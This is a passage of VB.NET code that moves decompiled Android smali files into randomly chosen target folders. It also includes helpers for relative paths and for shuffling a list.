                Dim targetFolder As String = targetFolders(random.Next(targetFolders.Count))
                Dim targetFilePath As String = Path.Combine(targetFolder, relativePath)

                Directory.CreateDirectory(Path.GetDirectoryName(targetFilePath))
                File.Move(smaliFile.FilePath, targetFilePath)
            End If
        Next
    End Sub

    ' Helper class for smali file + source root
    Public Class SmaliFile
        Public Property FilePath As String
        Public Property SourceRoot As String

        Public Sub New(filePath As String, sourceRoot As String)
            Me.FilePath = filePath
            Me.SourceRoot = sourceRoot
        End Sub
    End Class

    ' Custom GetRelativePath for .NET 4.5
    Public Function GetRelativePath(basePath As String, targetPath As String) As String
        Dim baseUri As New Uri(If(basePath.EndsWith(Path.DirectorySeparatorChar), basePath, basePath & Path.DirectorySeparatorChar))
        Dim targetUri As New Uri(targetPath)
        Return Uri.UnescapeDataString(baseUri.MakeRelativeUri(targetUri).ToString().Replace("/"c, Path.DirectorySeparatorChar))
    End Function

    ' List shuffle method compatible with .NET 4.5
    Public Sub ShuffleList(Of T)(list As IList(Of T), random As Random)
        For i As Integer = list.Count - 1 To 1 Step -1
            Dim j As Integer = random.Next(i + 1)
            Dim temp As T = list(i)
            list(i) = list(j)
            list(j) = temp
        Next
    End Sub
End Module
